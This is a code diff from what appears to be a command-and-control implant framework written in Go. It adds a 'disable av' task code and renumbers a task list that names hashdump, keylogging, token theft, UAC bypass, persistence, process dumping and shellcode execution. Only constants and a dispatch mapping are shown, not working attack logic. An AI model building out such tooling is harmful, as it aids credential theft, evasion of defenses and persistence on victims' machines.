@@ -14,46 +14,47 @@ const (
 	TASK_CMD          = 0x04
 	TASK_CONNECT      = 0x05
 	TASK_CP           = 0x06
-	TASK_DLL          = 0x07
-	TASK_DOWNLOAD     = 0x08
-	TASK_ENV_LS       = 0x09
-	TASK_FIND         = 0x10
-	TASK_GROUP_LS     = 0x11
-	TASK_HASHDUMP     = 0x12
-	TASK_HISTORY      = 0x13
-	TASK_IP           = 0x14
-	TASK_JITTER       = 0x15
-	TASK_KEYLOG       = 0x16
-	TASK_KILL         = 0x17
-	TASK_KILLDATE     = 0x18
-	TASK_LS           = 0x19
-	TASK_MIGRATE      = 0x20
-	TASK_MKDIR        = 0x21
-	TASK_MV           = 0x22
-	TASK_NET          = 0x23
-	TASK_PE           = 0x24
-	TASK_PERSIST      = 0x25
-	TASK_PROCDUMP     = 0x26
-	TASK_PS_KILL      = 0x27
-	TASK_PS_LS        = 0x28
-	TASK_PWD          = 0x29
-	TASK_REG_QUERY    = 0x30
-	TASK_RM           = 0x31
-	TASK_RMDIR        = 0x32
-	TASK_RPORTFWD_ADD = 0x33
-	TASK_RPORTFWD_LS  = 0x34
-	TASK_RPORTFWD_RM  = 0x35
-	TASK_RUNAS        = 0x36
-	TASK_SCREENSHOT   = 0x37
-	TASK_SHELLCODE    = 0x38
-	TASK_SLEEP        = 0x39
-	TASK_TOKEN_REVERT = 0x40
-	TASK_TOKEN_STEAL  = 0x41
-	TASK_UAC          = 0x42
-	TASK_UPLOAD       = 0x43
-	TASK_USER_LS      = 0x44
-	TASK_WHOAMI       = 0x45
-	TASK_WHOAMI_PRIV  = 0x46
+	TASK_DISABLE_AV   = 0x07
+	TASK_DLL          = 0x08
+	TASK_DOWNLOAD     = 0x09
+	TASK_ENV_LS       = 0x10
+	TASK_FIND         = 0x11
+	TASK_GROUP_LS     = 0x12
+	TASK_HASHDUMP     = 0x13
+	TASK_HISTORY      = 0x14
+	TASK_IP           = 0x15
+	TASK_JITTER       = 0x16
+	TASK_KEYLOG       = 0x17
+	TASK_KILL         = 0x18
+	TASK_KILLDATE     = 0x19
+	TASK_LS           = 0x20
+	TASK_MIGRATE      = 0x21
+	TASK_MKDIR        = 0x22
+	TASK_MV           = 0x23
+	TASK_NET          = 0x24
+	TASK_PE           = 0x25
+	TASK_PERSIST      = 0x26
+	TASK_PROCDUMP     = 0x27
+	TASK_PS_KILL      = 0x28
+	TASK_PS_LS        = 0x29
+	TASK_PWD          = 0x30
+	TASK_REG_QUERY    = 0x31
+	TASK_RM           = 0x32
+	TASK_RMDIR        = 0x33
+	TASK_RPORTFWD_ADD = 0x34
+	TASK_RPORTFWD_LS  = 0x35
+	TASK_RPORTFWD_RM  = 0x36
+	TASK_RUNAS        = 0x37
+	TASK_SCREENSHOT   = 0x38
+	TASK_SHELLCODE    = 0x39
+	TASK_SLEEP        = 0x40
+	TASK_TOKEN_REVERT = 0x41
+	TASK_TOKEN_STEAL  = 0x42
+	TASK_UAC          = 0x43
+	TASK_UPLOAD       = 0x44
+	TASK_USER_LS      = 0x45
+	TASK_WHOAMI       = 0x46
+	TASK_WHOAMI_PRIV  = 0x47
 )
 
 func GetTaskCode(task string) (int, error) {
@@ -70,6 +71,8 @@ func GetTaskCode(task string) (int, error) {
 		return TASK_CONNECT, nil
 	case "cp":
 		return TASK_CP, nil
+	case "disable av":
+		return TASK_DISABLE_AV, nil
 	case "dll":
 		return TASK_DLL, nil
 	case "download":
